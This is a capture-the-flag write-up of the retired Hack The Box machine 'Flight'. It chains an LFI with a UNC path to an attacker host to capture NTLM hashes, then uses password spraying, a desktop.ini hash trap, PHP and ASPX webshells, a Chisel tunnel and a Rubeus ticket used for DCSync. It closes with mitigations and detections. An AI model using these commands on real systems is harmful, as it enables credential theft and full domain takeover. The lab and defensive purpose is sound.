---
machine: Flight
os: Windows
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, lfi, ntlm, dcsync]
---

# Flight — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable note.
> Reference note based on HTB's public documentation and technical writeups. No real flags, credentials or hashes.

## TL;DR

An LFI on `school.flight.htb` includes a UNC path and forces the Apache service to authenticate over SMB, leaking `svc_apache`'s NetNTLMv2. That password is reused by `S.Moon`, who can write to `Shared`; a malicious `desktop.ini` captures `C.Bum`'s hash. Those credentials allow a PHP webshell on the public site and execution as `svc_apache`. The next hop is an internal IIS site on `127.0.0.1:8000`: an ASPX webshell runs as `DefaultAppPool`, requests a machine-account TGT with Rubeus, and that ticket enables DCSync.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
53/tcp    domain
80/tcp    http    Apache 2.4.52 (Win64) PHP/8.1.1
88/tcp    kerberos-sec
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap
445/tcp   microsoft-ds
464/tcp   kpasswd5
593/tcp   http-rpc-epmap
636/tcp   ldapssl
5985/tcp  wsman
9389/tcp  adws
```

The port set and the `flight.htb` domain identify a domain controller. The main site is an airline page; the interesting surface is a second vhost.

## Enumeration

```bash
ffuf -u http://flight.htb/ -H 'Host: FUZZ.flight.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

`school.flight.htb` serves a PHP portal with `index.php?view=home.html`. The parameter is concatenated into a file-read call without canonicalisation and accepts UNC paths.

```text
http://school.flight.htb/index.php?view=home.html
```

## Foothold

Start Responder and point `view` at an SMB resource you control:

```bash
sudo responder -I tun0
```

```text
http://school.flight.htb/index.php?view=//<ATTACKER_IP>/share/poc.txt
```

Windows tries to authenticate over SMB and leaks `svc_apache`'s NetNTLMv2. Crack it offline:

```bash
hashcat -m 5600 svc_apache.txt /usr/share/wordlists/rockyou.txt
```

Spray the recovered password against domain users. `S.Moon` reuses it.

```bash
nxc smb flight.htb -u svc_apache -p '<PASSWORD>' --users
nxc smb flight.htb -u S.Moon -p '<PASSWORD>' --shares
```

`S.Moon` has `READ,WRITE` on `Shared`. Generate authentication-forcing files (for example, a `desktop.ini` pointing to a UNC path) and upload them. When `C.Bum` opens the share, Responder captures the NetNTLMv2; cracking it yields a second password.

## Lateral movement

`C.Bum` can write to `Web`, which maps to Apache's docroot. Upload a PHP webshell into an accessible vhost directory:

```bash
smbclient //flight.htb/Web -U 'c.bum%<PASSWORD>'
# cd school.flight.htb\styles
# put shell.php
```

```text
http://school.flight.htb/styles/shell.php?cmd=whoami
# flight\svc_apache
```

`netstat` shows IIS listening only on `127.0.0.1:8000`. Create a reverse Chisel tunnel and reach the internal site. `C.Bum` can write to its docroot; upload an `.aspx` and execute as `IIS APPPOOL\DefaultAppPool`.

## Privilege escalation

An app-pool virtual account authenticates over the network as the machine account (`G0$`). Upload Rubeus and request a TGT with fake delegation:

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

Convert the ticket to a ccache and use Kerberos for DCSync:

```bash
kirbi2ccache ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass g0.flight.htb
```

Use the Administrator hash with `psexec.py -hashes`, or reuse the ticket. The key is that the machine-account ticket has enough rights to replicate the directory.

## Evidence

- Responder capture showing the username and NetNTLMv2 challenge, with the hash redacted.
- `whoami` as `svc_apache` and as `DefaultAppPool`.
- Trimmed `secretsdump` output, with no complete hashes.

## Lessons learned

- An LFI that only "reads files" can become credential theft when the process resolves UNC paths.
- Password reuse between service accounts and human users chains two hops together.
- Writable shares are an authentication-forcing surface, not just storage.
- A service on `localhost` is still reachable from a user shell; the tunnel is the missing step.

## Mitigations and detection

- **Fix:** canonicalise and allowlist `view` templates; run Apache under a service account without network logon; disable NTLM where possible; stop password reuse; apply least privilege to share ACLs; segment the internal IIS site.
- **Detection:** 4624/4625 type 3 events from the web host; unexpected outbound SMB authentication; `desktop.ini` creation in shares; `w3wp.exe` spawning `cmd.exe` or `powershell.exe`; `tgtdeleg` requests and DCSync (4662 on the domain object).
- MITRE ATT&CK: T1557.001 (LLMNR/NBT-NS poisoning and SMB relay), T1552.001 (credentials in files), T1003.006 (DCSync).

## References

- <https://www.hackthebox.com/machines/Flight>
- <https://0xdf.gitlab.io/2023/05/06/htb-flight.html>
- <https://attack.mitre.org/techniques/T1557/001/>
- <https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview>
